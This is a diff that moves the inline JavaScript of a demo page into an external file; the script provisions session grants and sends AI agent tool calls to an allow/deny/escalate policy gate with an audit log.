-    if ([...toolEl.options].some(o => o.value === s.tool || o.text === s.tool)) toolEl.value = s.tool;
-    document.getElementById("argJson").value = JSON.stringify(s.args);
-    renderConstraints();
-    decide(s.tool, s.args);
-  };
-  scenEl.appendChild(b);
-}
-
-async function provision() {
-  const allowed_actions = [...actionsEl.querySelectorAll(".row")].map(row => ({
-    tool: row.querySelector(".t").value,
-    resource: row.querySelector(".r").value.trim() || null,
-  }));
-  const body = {
-    session_id: document.getElementById("session").value,
-    subject: document.getElementById("subject").value,
-    allowed_actions,
-  };
-  const r = await fetch("/v1/sessions", {method:"POST", headers:{"content-type":"application/json"}, body:JSON.stringify(body)});
-  const j = await r.json();
-  document.getElementById("provNote").innerHTML =
-    `✔ ${j.grants_written} grants written for <b>${body.subject}</b> — intent is now frozen for this session.`;
-  const chip = document.getElementById("sessChip");
-  chip.className = "chip ok";
-  chip.textContent = `● session ${body.session_id} · ${j.grants_written} grants — try an attempt`;
-}
-
-async function decide(tool, args) {
-  const body = {
-    session_id: document.getElementById("session").value,
-    subject: document.getElementById("subject").value,
-    tool, arguments: args, mode_override: mode,
-  };
-  const r = await fetch("/v1/decide", {method:"POST", headers:{"content-type":"application/json"}, body:JSON.stringify(body)});
-  const v = await r.json();
-  const detail = await refreshAudit(v.decision_id);
-  showVerdict(v, detail);
-}
-
-function renderPipe(reason, decision){
-  const fired = REASON_GATE[reason] ?? 3;
-  return GATES.map((g, i) => {
-    let cls = "gate";
-    if (i < fired) cls += " passed";
-    else if (i === fired) cls += " fired-" + decision;
-    else cls += " notreached";
-    return `<div class="${cls}"><b>${g.name}</b>${g.desc}</div>`;
-  }).join("");
-}
-
-const STAMP_WORD = { allow:"Allowed", deny:"Denied", escalate:"Escalated" };
-function showVerdict(v, detail) {
-  const stamp = document.getElementById("stamp");
-  stamp.className = "stamp " + v.decision;
-  stamp.textContent = STAMP_WORD[v.decision] || v.decision;
-  // retrigger the stamp animation
-  void stamp.offsetWidth;
-  stamp.classList.add("inked");
-  // In observe mode the pipeline shows what enforce WOULD have decided.
-  const effective = v.would_have_decided || v.decision;
-  document.getElementById("pipe").innerHTML = renderPipe(v.reason, effective);
-  let explain = REASON_EXPLAIN[v.reason] || "";
-  if (v.would_have_decided && v.would_have_decided !== "allow")
-    explain += ` <br>👁 <b>Observe mode:</b> the call went through, but the pipeline above shows what enforce would have done — flip the switch (top right) to enforce it.`;
-  if (detail && detail !== "—")
-    explain += ` <br>🔎 violation detail: <span class="err-detail">${detail}</span>`;
-  document.getElementById("explain").innerHTML = explain;
-  let kv = `reason <b>${v.reason}</b> &nbsp;·&nbsp; effective mode <b>${v.effective_mode}</b>`;
-  if (v.would_have_decided) kv += ` &nbsp;·&nbsp; would have <b>${v.would_have_decided}</b>`;
-  if (v.escalation_prompt) kv += `<br><br>🧑 <b>${v.escalation_prompt}</b>`;
-  kv += `<br><span class="note">decision_id ${v.decision_id}</span>`;
-  document.getElementById("verdictKv").innerHTML = kv;
-  document.getElementById("verdict").classList.add("show");
-}
-
-async function refreshAudit(findDecisionId) {
-  const r = await fetch("/v1/audit?limit=50");
-  const j = await r.json();
-  let detail = "—";
-  const rows = j.entries.slice().reverse().map(e => {
-    if (findDecisionId && e.decision_id === findDecisionId && e.error) detail = e.error;
-    return `
-    <tr>
-      <td><span class="ministamp ${e.decision}">${(STAMP_WORD[e.decision] || e.decision).toUpperCase()}</span></td>
-      <td class="code">${e.tool} → ${e.resource}</td>
-      <td class="code">${e.reason}</td>
-      <td>${e.error ? `<span class="err-detail">${e.error}</span>` : "—"}</td>
-      <td>${e.effective_mode}</td>
-      <td>${e.would_have_decided ?? "—"}</td>
-      <td class="threats">${(e.owasp_threats||[]).join("<br>") || "—"}</td>
-    </tr>`;
-  }).join("");
-  document.getElementById("audit").innerHTML = rows ||
-    `<tr><td colspan="7" class="note">No decisions yet.</td></tr>`;
-  return detail;
-}
-
-document.getElementById("provision").onclick = provision;
-document.getElementById("send").onclick = () => {
-  let args;
-  try { args = JSON.parse(document.getElementById("argJson").value || "{}"); }
-  catch (e) { alert("Arguments must be valid JSON: " + e.message); return; }
-  decide(toolEl.value, args);
-};
-
-loadRegistry();
-refreshAudit();
-</script>
+<script src="/demo/static/app.js"></script>
 </body>
 </html>
